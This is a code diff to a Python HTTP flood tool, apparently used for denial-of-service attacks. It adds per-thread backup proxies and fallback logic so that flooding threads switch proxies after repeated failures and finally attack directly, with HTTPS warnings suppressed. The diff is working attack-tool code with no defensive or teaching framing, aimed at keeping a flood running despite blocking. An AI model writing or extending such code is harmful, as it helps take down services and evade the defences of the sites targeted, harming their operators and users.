@@ -312,12 +312,17 @@ class HTTPFlood:
         
         if config.proxies:
             self.thread_proxies = []
+            self.backup_proxies = []
+            proxy_count = len(config.proxies)
             for i in range(self.threads):
-                proxy = config.proxies[i % len(config.proxies)]
+                proxy = config.proxies[i % proxy_count]
                 self.thread_proxies.append({'http': proxy, 'https': proxy})
-            print(f"[*] Assigned {len(self.thread_proxies)} proxies to threads")
+                backup = config.proxies[(i + proxy_count // 2) % proxy_count]
+                self.backup_proxies.append({'http': backup, 'https': backup})
+            print(f"[*] Assigned {len(self.thread_proxies)} proxies with backups to threads")
         else:
             self.thread_proxies = None
+            self.backup_proxies = None
         
         config.stats['start_time'] = time.time()
         self.running = True
@@ -336,14 +341,19 @@ class HTTPFlood:
         session.mount('http://', adapter)
         session.mount('https://', adapter)
         
+        current_proxy = None
         if self.thread_proxies:
-            session.proxies = self.thread_proxies[thread_id % len(self.thread_proxies)]
+            current_proxy = self.thread_proxies[thread_id % len(self.thread_proxies)]
+            session.proxies = current_proxy
         
         import warnings
         warnings.filterwarnings('ignore', message='Unverified HTTPS request')
         
         end_time = time.time() + self.duration
         local_count = 0
+        consecutive_fails = 0
+        using_backup = False
+        no_proxy_mode = False
         
         while self.running and time.time() < end_time:
             try:
@@ -378,6 +388,7 @@ class HTTPFlood:
                     bytes_received=len(response.content)
                 )
                 
+                consecutive_fails = 0
                 local_count += 1
                 
                 if config.debug and local_count % 100 == 0:
@@ -389,6 +400,22 @@ class HTTPFlood:
                     requests.exceptions.Timeout,
                     requests.exceptions.ReadTimeout) as e:
                 update_stats(success=False)
+                consecutive_fails += 1
+                
+                if consecutive_fails >= 10 and not using_backup and self.backup_proxies and not no_proxy_mode:
+                    backup_proxy = self.backup_proxies[thread_id % len(self.backup_proxies)]
+                    session.proxies = backup_proxy
+                    using_backup = True
+                    consecutive_fails = 0
+                    if config.debug:
+                        print(f"[DEBUG] Thread-{thread_id}: Switched to backup proxy")
+                elif consecutive_fails >= 20 and not no_proxy_mode:
+                    session.proxies = {}
+                    no_proxy_mode = True
+                    consecutive_fails = 0
+                    if config.debug:
+                        print(f"[DEBUG] Thread-{thread_id}: Disabled proxy, going direct")
+                
                 if config.debug and local_count % 100 == 0:
                     print(f"[DEBUG] Thread-{thread_id} error: {type(e).__name__}")
                 
